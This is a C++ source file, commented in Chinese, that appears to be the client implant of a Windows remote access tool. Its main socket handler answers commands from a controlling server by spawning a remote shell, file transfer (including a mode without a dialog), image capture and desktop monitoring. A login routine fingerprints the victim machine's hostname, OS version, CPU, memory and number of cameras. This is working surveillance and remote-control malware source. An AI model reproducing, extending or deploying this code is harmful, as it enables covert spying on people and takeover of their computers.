#include "pch.h"
#include "MainSocket.h"
#include "RemoteShell.h"
#include "FileTransfer.h"
#include "ImageCapture.h"
#include "DesktopMonitor.h"

#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")

using namespace nsMainSocket;


CMainSocket::CMainSocket(TCP_MODE iTcpMode) : CSocket(iTcpMode, nsGeneralSocket::MAIN_SOCKET_SERVICE, nsGeneralSocket::ROOT_SOCKET_TYPE){
	m_bIsMainClientSocket = TRUE;
}


// 创建各服务的Socket
VOID CMainSocket::OnReceiveWithDec(ITcpClient* pSender, CONNID dwConnID, QWORD qwClientToken, WORD wServiceType, WORD wSocketType, int iCommandID, DWORD dwParentSocketTag, MyBuffer mBuffer) {
	DebugPrintRecvParams(dwConnID, qwClientToken, wServiceType, wSocketType, iCommandID, dwParentSocketTag, mBuffer);

	switch (iCommandID) {

	// ****************************************** 远程SHELL ******************************************
	case nsRemoteShell::REMOTE_SHELL_S2C: {
		CRemoteShell* pRemoteShell = new CRemoteShell(TCP_PACK, qwClientToken);
		pRemoteShell->InitSocket(m_wszAddress, m_wPort);
		pRemoteShell->StartSocket();
		SendWithEnc(nsRemoteShell::REMOTE_SHELL_C2S);
		break;
	}


	// ****************************************** 文件传输 ******************************************

	case nsFileTransfer::FILE_TRANSFER_S2C: {
		CFileTransfer* pFileTransfer = new CFileTransfer(TCP_PACK, nsGeneralSocket::ROOT_SOCKET_WITH_DIALOG_TYPE, qwClientToken);
		pFileTransfer->InitSocket(m_wszAddress, m_wPort);
		pFileTransfer->StartSocket();
		SendWithEnc(nsFileTransfer::FILE_TRANSFER_C2S);
		break;
	}

	case nsFileTransfer::FILE_TRANSFER_WITHOUT_DIALOG_S2C: {
		CFileTransfer* pFileTransfer = new CFileTransfer(TCP_PACK, nsGeneralSocket::ROOT_SOCKET_TYPE, qwClientToken);
		pFileTransfer->InitSocket(m_wszAddress, m_wPort);
		pFileTransfer->StartSocket();
		SendWithEnc(nsFileTransfer::FILE_TRANSFER_WITHOUT_DIALOG_C2S);
		break;
	}

	case nsFileTransfer::CREATE_LIST_SOCKET_S2C: {
		DWORD dwParentSocketTag = GetParentSocketTag(mBuffer);
		CFileTransfer* pFileTransfer = new CFileTransfer(TCP_PACK, nsFileTransfer::LIST_FILES_SOCKET, qwClientToken, dwParentSocketTag);
		pFileTransfer->SetParentSocketTag(dwParentSocketTag);
		pFileTransfer->InitSocket(m_wszAddress, m_wPort);
		pFileTransfer->StartSocket();
		SendWithEnc(nsFileTransfer::CREATE_LIST_SOCKET_C2S);
		break;
	}

	case nsFileTransfer::CREATE_FILE_SOCKET_S2C: {
		DWORD dwParentSocketTag = GetParentSocketTag(mBuffer);
		CFileTransfer* pFileTransfer = new CFileTransfer(TCP_PACK, nsFileTransfer::FILE_TRANSFER_SOCKET, qwClientToken, dwParentSocketTag);
		pFileTransfer->SetParentSocketTag(dwParentSocketTag);
		pFileTransfer->InitSocket(m_wszAddress, m_wPort);
		pFileTransfer->StartSocket();
		SendWithEnc(nsFileTransfer::CREATE_FILE_SOCKET_C2S);
		break;
	}


	// ****************************************** 图像捕获 ******************************************
	case nsImageCapture::IMAGE_CAPTURE_S2C: {
		CImageCapture* pImageCapture = new CImageCapture(TCP_PACK, qwClientToken);
		pImageCapture->InitSocket(m_wszAddress, m_wPort);
		pImageCapture->StartSocket();
		SendWithEnc(nsImageCapture::IMAGE_CAPTURE_C2S);
		break;
	}
		
	
	// ****************************************** 桌面监控 ******************************************

	case nsDesktopMonitor::DESKTOP_MONITOR_S2C: {
		CDesktopMonitor* pDesktopMonitor = new CDesktopMonitor(TCP_PACK, nsGeneralSocket::ROOT_SOCKET_WITH_DIALOG_TYPE, qwClientToken);
		pDesktopMonitor->InitSocket(m_wszAddress, m_wPort);
		pDesktopMonitor->StartSocket();
		SendWithEnc(nsDesktopMonitor::DESKTOP_MONITOR_C2S);
		break;
	}

	/*case nsFileTransfer::FILE_TRANSFER_WITHOUT_DIALOG_S2C: {
		CFileTransfer* pFileTransfer = new CFileTransfer(TCP_PACK, nsGeneralSocket::ROOT_SOCKET_TYPE, qwClientToken);
		pFileTransfer->InitSocket(m_pwszAddress, m_wPort);
		pFileTransfer->StartSocket();
		SendWithEnc(nsFileTransfer::FILE_TRANSFER_WITHOUT_DIALOG_C2S);
		break;
	}*/

	//case nsDesktopMonitor::CREATE_IMAGE_SOCKET_S2C: {
	//	DWORD dwParentSocketTag = GetParentSocketTag(sData);
	//	CDesktopMonitor* pDesktopMonitor = new CDesktopMonitor(TCP_PACK, nsDesktopMonitor::IMAGE_SOCKET, qwClientToken, dwParentSocketTag);
	//	pDesktopMonitor->SetParentSocketTag(dwParentSocketTag);
	//	pDesktopMonitor->InitSocket(m_pwszAddress, m_wPort);
	//	pDesktopMonitor->StartSocket();
	//	m_pImageSocket = pDesktopMonitor;
	//	SendWithEnc(nsDesktopMonitor::CREATE_IMAGE_SOCKET_C2S);
	//	break;
	//}

	/*case nsFileTransfer::CREATE_FILE_SOCKET_S2C: {
		DWORD dwParentSocketTag = GetParentSocketTag(sData);
		CFileTransfer* pFileTransfer = new CFileTransfer(TCP_PACK, nsFileTransfer::FILE_TRANSFER_SOCKET, qwClientToken, dwParentSocketTag);
		pFileTransfer->SetParentSocketTag(dwParentSocketTag);
		pFileTransfer->InitSocket(m_pwszAddress, m_wPort);
		pFileTransfer->StartSocket();
		SendWithEnc(nsFileTransfer::CREATE_FILE_SOCKET_C2S);
		break;
	}*/


	}

}


VOID CMainSocket::SendLoginPacket() {
	_LoginPacket_C2S mData;
	mData.sHostName = GetHostName();
	mData.sOsVersion = GetOsVersion();
	mData.sCpuType = GetCpuType();
	mData.sMemoryInfo = GetMemoryInfo();
	mData.dwCameraNum = GetCameraNum();

	PBYTE pBuffer = nullptr;
	MyBuffer mBuffer = MsgPack<_LoginPacket_C2S>(mData);

	SendWithEnc(LOGIN_PACKET_C2S, mBuffer.ptr(), mBuffer.size());
	delete[] pBuffer;
}


DWORD CMainSocket::GetParentSocketTag(MyBuffer mBuffer) {
	nsGeneralSocket::_CreateChildSocket mData = MsgUnpack<nsGeneralSocket::_CreateChildSocket>(mBuffer.ptr(), mBuffer.size());
	return mData.dwParentSocketTag;
}



// ************************************************ 主机名 ************************************************

string GetHostName() {
	CHAR szHostName[48];
	gethostname(szHostName, 48);
	string sHostName = szHostName;
	return sHostName;
}


// ************************************************ 系统版本 ************************************************

// 获取注册表值
string GetRegKeyW(HKEY hKey, PWCHAR pwszSubKey, PWCHAR pwszValueName)
{
	HKEY hSubKey;
	DWORD dwType = REG_SZ;
	DWORD dwBufLen = 0;
	PWCHAR pwszRegValue = NULL;

	if (ERROR_SUCCESS == RegOpenKey(hKey, pwszSubKey, &hSubKey))
	{
		if (ERROR_SUCCESS == RegQueryValueEx(hSubKey, pwszValueName, 0, &dwType, NULL, &dwBufLen))
		{
			pwszRegValue = new WCHAR[dwBufLen + 1];
			memset(pwszRegValue, 0, dwBufLen + 1);

			if (ERROR_SUCCESS == RegQueryValueEx(hSubKey, pwszValueName, 0, &dwType, (LPBYTE)pwszRegValue, &dwBufLen)) {
				RegCloseKey(hKey);
				string result = Wchars2Str(pwszRegValue);
				delete[] pwszRegValue;
				return result;
			}
		}
	}

	RegCloseKey(hKey);
	delete[] pwszRegValue;
	return "";
}


string GetOsVersion() {
	WCHAR wszSubKey[] = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
	WCHAR wszValueName[] = L"ProductName";
	string sOsVersion = GetRegKeyW(HKEY_LOCAL_MACHINE, wszSubKey, wszValueName);
	return (sOsVersion == "") ? "UNKNOWN" : sOsVersion;
}


// ************************************************ CPU信息 ************************************************

string GetCpuType() {
	int aCpuInfo[4] = { -1 };
	char szCpuInfo[0x41];
	memset(szCpuInfo, 0, sizeof(szCpuInfo));

	__cpuid(aCpuInfo, 0x80000002);
	memcpy(szCpuInfo, aCpuInfo, sizeof(aCpuInfo));

	__cpuid(aCpuInfo, 0x80000003);
	memcpy(szCpuInfo + 16, aCpuInfo, sizeof(aCpuInfo));

	__cpuid(aCpuInfo, 0x80000004);
	memcpy(szCpuInfo + 32, aCpuInfo, sizeof(aCpuInfo));

	return Bytes2Str((PBYTE)szCpuInfo, strlen(szCpuInfo));
}


// ************************************************ 内存信息 ************************************************

#define  GBYTES  1073741824    
#define  MBYTES  1048576    
#define  KBYTES  1024    
#define  DKBYTES 1024.0    

string GetMemoryInfo()
{
	string sMemoryInfo = "";

	MEMORYSTATUSEX statusex;
	statusex.dwLength = sizeof(statusex);
	if (GlobalMemoryStatusEx(&statusex))
	{
		unsigned long long total = 0, remain_total = 0, avl = 0, remain_avl = 0;
		double decimal_total = 0, decimal_avl = 0;
		remain_total = statusex.ullTotalPhys % GBYTES;
		total = statusex.ullTotalPhys / GBYTES;
		avl = statusex.ullAvailPhys / GBYTES;
		remain_avl = statusex.ullAvailPhys % GBYTES;
		if (remain_total > 0)
			decimal_total = (remain_total / MBYTES) / DKBYTES;
		if (remain_avl > 0)
			decimal_avl = (remain_avl / MBYTES) / DKBYTES;

		decimal_total += (double)total;
		decimal_avl += (double)avl;


		CHAR szMemoryInfo[48];
		double decimal_used = decimal_total - decimal_avl;
		int length = sprintf_s(szMemoryInfo, 48, "%.2fGB/%.2fGB (%d%%)", decimal_used, decimal_total, int(decimal_used / decimal_total * 100));
		sMemoryInfo = szMemoryInfo;
	}

	return sMemoryInfo;
}


// ************************************************ 摄像头 ************************************************

#include "strmif.h"
#include <initguid.h>
#include <vector>
#pragma comment(lib, "setupapi.lib")

#define VI_MAX_CAMERAS 20
DEFINE_GUID(CLSID_SystemDeviceEnum, 0x62be5d10, 0x60eb, 0x11d0, 0xbd, 0x3b, 0x00, 0xa0, 0xc9, 0x11, 0xce, 0x86);
DEFINE_GUID(CLSID_VideoInputDeviceCategory, 0x860bb310, 0x5d01, 0x11d0, 0xbd, 0x3b, 0x00, 0xa0, 0xc9, 0x11, 0xce, 0x86);
DEFINE_GUID(IID_ICreateDevEnum, 0x29840822, 0x5b84, 0x11d0, 0xbd, 0x3b, 0x00, 0xa0, 0xc9, 0x11, 0xce, 0x86);


// 列出摄像头设备
int ListCameraDevices(vector<string>& list)
{
	ICreateDevEnum* pDevEnum = NULL;
	IEnumMoniker* pEnum = NULL;
	int deviceCounter = 0;
	CoInitialize(NULL);
	HRESULT hr = CoCreateInstance(
		CLSID_SystemDeviceEnum,
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_ICreateDevEnum,
		reinterpret_cast<void**>(&pDevEnum)
	);

	if (SUCCEEDED(hr))
	{
		hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
		if (hr == S_OK) {
			IMoniker* pMoniker = NULL;
			while (pEnum->Next(1, &pMoniker, NULL) == S_OK)
			{
				IPropertyBag* pPropBag;
				hr = pMoniker->BindToStorage(0, 0, IID_IPropertyBag,
					(void**)(&pPropBag));

				if (FAILED(hr)) {
					pMoniker->Release();
					continue; // Skip this one, maybe the next one will work.
				}

				VARIANT varName;
				VariantInit(&varName);
				hr = pPropBag->Read(L"Description", &varName, 0);

				if (FAILED(hr)) {
					hr = pPropBag->Read(L"FriendlyName", &varName, 0);
				}

				if (SUCCEEDED(hr)) {
					hr = pPropBag->Read(L"FriendlyName", &varName, 0);
					int count = 0;
					char tmp[255] = { 0 };

					while (varName.bstrVal[count] != 0x00 && count < 255)
					{
						tmp[count] = (char)varName.bstrVal[count];
						count++;
					}
					list.push_back(tmp);
				}

				pPropBag->Release();
				pPropBag = NULL;
				pMoniker->Release();
				pMoniker = NULL;
				deviceCounter++;

			}

			pDevEnum->Release();
			pDevEnum = NULL;
			pEnum->Release();
			pEnum = NULL;
		}
	}

	return deviceCounter;
}


DWORD GetCameraNum() {
	vector<string> CameraNames;				//存储摄像头名称
	return ListCameraDevices(CameraNames);
}